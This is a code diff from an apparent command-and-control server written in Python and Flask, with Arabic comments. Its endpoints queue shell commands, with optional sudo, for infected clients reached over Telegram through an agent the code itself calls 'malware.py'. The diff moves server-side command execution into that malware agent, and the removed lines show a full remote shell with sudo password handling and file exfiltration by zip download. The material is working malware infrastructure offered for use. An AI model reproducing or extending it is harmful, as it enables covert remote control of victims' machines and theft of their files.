@@ -252,8 +252,7 @@ def _save_server_config():
 
 _load_server_config()
 
-# ======================== حالة الـ shell للـ C2-Server ========================
-# These track the current working directory and user for [C2-Server] commands
+# ======================== حالة الـ shell على جهاز Flask (تحميل / تنزيل من الداش فقط) ========================
 C2_CWD  = os.path.expanduser("~")
 C2_USER = os.environ.get('USER', os.environ.get('LOGNAME', os.environ.get('USERNAME', 'user')))
 
@@ -735,7 +734,6 @@ def receive_data():
 @rate_limit
 @require_auth
 def receive_command():
-    global C2_CWD, C2_USER
     data = request.json
     cmd       = data.get("command", "").strip()
     client_id = data.get("client_id", "all")
@@ -743,7 +741,7 @@ def receive_command():
 
     logger.warning(f"💀 Command received: {cmd} for {client_id} (sudo={use_sudo})")
 
-    # لو [C2-Server] عنده session تيليجرام (malware.py شغال عليه) → يبعت عبر Telegram
+    # لو [C2-Server] عنده session تيليجرام (malware.py على السيرفر) → يبعت عبر Telegram
     if client_id == "[C2-Server]" and "[C2-Server]" in tg_sessions:
         row_id = save_command_to_db(cmd, client_id)
         final_cmd = f"sudo -n bash -c '{cmd}'" if use_sudo else cmd
@@ -751,174 +749,13 @@ def receive_command():
         logger.info(f"📤 TG Command → [C2-Server]: {cmd}")
         return jsonify({"status": "sent_via_telegram", "command_id": row_id})
 
-    # If the target is the C2 server itself, execute locally and return result immediately
+    # لا تنفيذ محلي — [C2-Server] يعمل فقط عبر عميل Telegram على نفس الجهاز
     if client_id == "[C2-Server]":
-        stripped = cmd.strip()
-
-        # ── Handle `get <path>` — return a download_path for the browser ──
-        import re as _re
-        get_m = _re.match(r'^get\s+(.+)$', stripped, _re.IGNORECASE)
-        if get_m:
-            raw_path = get_m.group(1).strip()
-            if raw_path.startswith("~"):
-                raw_path = os.path.expanduser(raw_path)
-            elif not os.path.isabs(raw_path):
-                raw_path = os.path.join(C2_CWD, raw_path)
-            raw_path = os.path.normpath(raw_path)
-
-            if not os.path.exists(raw_path):
-                output  = f"get: {raw_path}: No such file or directory"
-                status  = "error"
-                dl_path = None
-            elif os.path.isdir(raw_path):
-                # Zip the directory on-the-fly and save to uploads/
-                import zipfile, io as _io
-                zip_name   = os.path.basename(raw_path.rstrip("/")) + ".zip"
-                zip_dir    = os.path.join(os.path.dirname(os.path.abspath(__file__)), "uploads")
-                os.makedirs(zip_dir, exist_ok=True)
-                zip_path   = os.path.join(zip_dir, f"{int(time.time())}_{zip_name}")
-                try:
-                    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
-                        for root, _, files in os.walk(raw_path):
-                            for fname in files:
-                                fpath   = os.path.join(root, fname)
-                                arcname = os.path.relpath(fpath, os.path.dirname(raw_path))
-                                zf.write(fpath, arcname)
-                    size_kb = os.path.getsize(zip_path) / 1024
-                    output  = f"Directory zipped → {zip_name} ({size_kb:.1f} KB)"
-                    status  = "done"
-                    dl_path = zip_path
-                except Exception as ze:
-                    output  = f"get: failed to zip directory: {ze}"
-                    status  = "error"
-                    dl_path = None
-            elif os.path.getsize(raw_path) > 100 * 1024 * 1024:
-                output  = f"get: file too large ({os.path.getsize(raw_path) // (1024*1024)} MB). Max 100 MB."
-                status  = "error"
-                dl_path = None
-            else:
-                size_kb = os.path.getsize(raw_path) / 1024
-                output  = f"Ready to download: {os.path.basename(raw_path)} ({size_kb:.1f} KB)"
-                status  = "done"
-                dl_path = raw_path
-
-            row_id = save_command_to_db(cmd, client_id, cwd=_format_cwd_display(C2_CWD))
-            try:
-                conn = sqlite3.connect(DB_PATH)
-                conn.execute('UPDATE commands SET status=?, result=?, executed_at=? WHERE id=?',
-                             (status, output, time.time(), row_id))
-                conn.commit()
-                conn.close()
-            except Exception as e:
-                logger.error(f"Failed to update get command: {e}")
-            return jsonify({
-                "status": status, "command_id": row_id,
-                "result": output, "cwd": _format_cwd_display(C2_CWD),
-                "user": C2_USER,
-                "download_path": dl_path,
-            })
-
-        # ── Handle `cd` specially ────────────────────────────────────
-        cd_match = None
-        if stripped == "cd" or stripped.startswith("cd ") or stripped.startswith("cd\t"):
-            cd_match = stripped[2:].strip() if len(stripped) > 2 else ""
-
-        if cd_match is not None:
-            # cd with no arg → go to home
-            target = os.path.expanduser(cd_match) if cd_match else os.path.expanduser("~")
-            # Handle relative paths
-            if not os.path.isabs(target):
-                target = os.path.join(C2_CWD, target)
-            target = os.path.normpath(target)
-            if os.path.isdir(target):
-                C2_CWD = target
-                output = ""
-                status = "done"
-            else:
-                output = f"bash: cd: {cd_match}: No such file or directory"
-                status = "error"
-            row_id = save_command_to_db(cmd, client_id, cwd=_format_cwd_display(C2_CWD))
-            try:
-                conn = sqlite3.connect(DB_PATH)
-                conn.execute(
-                    'UPDATE commands SET status=?, result=?, executed_at=? WHERE id=?',
-                    (status, output, time.time(), row_id)
-                )
-                conn.commit()
-                conn.close()
-            except Exception as e:
-                logger.error(f"Failed to update command result: {e}")
-            return jsonify({
-                "status": status, "command_id": row_id,
-                "result": output, "cwd": _format_cwd_display(C2_CWD),
-                "user": C2_USER,
-            })
-
-        # ── Save with current CWD ─────────────────────────────────────
-        row_id = save_command_to_db(cmd, client_id, cwd=_format_cwd_display(C2_CWD))
-
-        stdin_input = None
-        if use_sudo:
-            if SUDO_PASSWORD:
-                shell_cmd   = ["sudo", "-S", "bash", "-c", cmd]
-                stdin_input = SUDO_PASSWORD + "\n"
-                use_shell   = False
-            else:
-                shell_cmd = ["sudo", "-n", "bash", "-c", cmd]
-                use_shell = False
-        else:
-            shell_cmd = cmd
-            use_shell = True
-
-        try:
-            proc = subprocess.run(
-                shell_cmd, shell=use_shell,
-                input=stdin_input,
-                capture_output=True,
-                timeout=30, text=True,
-                cwd=C2_CWD,
-            )
-            combined = (proc.stdout or "") + (proc.stderr or "")
-            lines  = [l for l in combined.splitlines() if not l.startswith("[sudo]")]
-            output = "\n".join(lines).strip()
-            if proc.returncode == 0:
-                status = "done"
-            else:
-                if "a password is required" in output or "a terminal is required" in output:
-                    output = "[error: sudo requires a password — set sudo password in Server Settings]"
-                elif "incorrect password" in output.lower() or "authentication failure" in output.lower():
-                    output = "[error: incorrect sudo password — update it in Server Settings]"
-                elif not output:
-                    output = f"[error: exit code {proc.returncode}]"
-                status = "error"
-        except subprocess.TimeoutExpired:
-            output = "[error: command timed out after 30s]"
-            status = "error"
-        except FileNotFoundError:
-            output = "[error: sudo not found on this system]"
-            status = "error"
-        except Exception as e:
-            output = f"[error: {e}]"
-            status = "error"
-
-        # Update DB immediately with result
-        try:
-            conn = sqlite3.connect(DB_PATH)
-            conn.execute(
-                'UPDATE commands SET status=?, result=?, executed_at=? WHERE id=?',
-                (status, output, time.time(), row_id)
-            )
-            conn.commit()
-            conn.close()
-        except Exception as e:
-            logger.error(f"Failed to update command result: {e}")
-
-        logger.info(f"🖥️ [C2-Server] executed (sudo={use_sudo}): {cmd!r} → {status}")
+        logger.warning("[C2-Server] rejected — malware agent not connected (Telegram)")
         return jsonify({
-            "status": status, "command_id": row_id,
-            "result": output, "cwd": _format_cwd_display(C2_CWD),
-            "user": C2_USER,
-        })
+            "error": "agent_offline",
+            "message": "[C2-Server] requires malware.py on this machine with MALWARE_CLIENT_ID=[C2-Server] (included in ./start_all.sh).",
+        }), 503
 
     final_cmd = f"sudo -n bash -c '{cmd}'" if use_sudo else cmd
 
@@ -1023,20 +860,6 @@ def get_data():
     return jsonify(clients_data)
 
 # ======================== 8. عرض الأجهزة ========================
-def _get_server_info():
-    """Return static info about the machine running this server."""
-    try:
-        hostname = socket.gethostname()
-    except Exception:
-        hostname = "unknown"
-    try:
-        ip = socket.gethostbyname(hostname)
-    except Exception:
-        ip = "127.0.0.1"
-    os_info = f"{platform.system()} {platform.release()}".strip()
-    return hostname, ip, os_info
-
-
 def _prune_offline_clients(now=None):
     """إزالة الكلاينت الذين لم يُحدَّث last_seen منذ أكثر من CLIENT_OFFLINE_AFTER_SEC."""
     now = now if now is not None else time.time()
@@ -1073,23 +896,11 @@ def get_clients():
     _prune_offline_clients()
     readable = {}
 
-    # Permanent server entry — always online, always first
-    hostname, ip, os_info = _get_server_info()
-    now = time.time()
-    readable["[C2-Server]"] = {
-        "last_seen": time.ctime(now),
-        "timestamp": now,
-        "is_server": True,
-        "hostname": hostname,
-        "ip": ip,
-        "os": os_info,
-    }
-
     for cid, info in clients.items():
         readable[cid] = {
             "last_seen": time.ctime(info["last_seen"]),
             "timestamp": info["last_seen"],
-            "is_server": False,
+            "is_server": (cid == "[C2-Server]"),
             "os": info.get("os", ""),
             "hostname": info.get("hostname", ""),
             "ip": info.get("ip", ""),
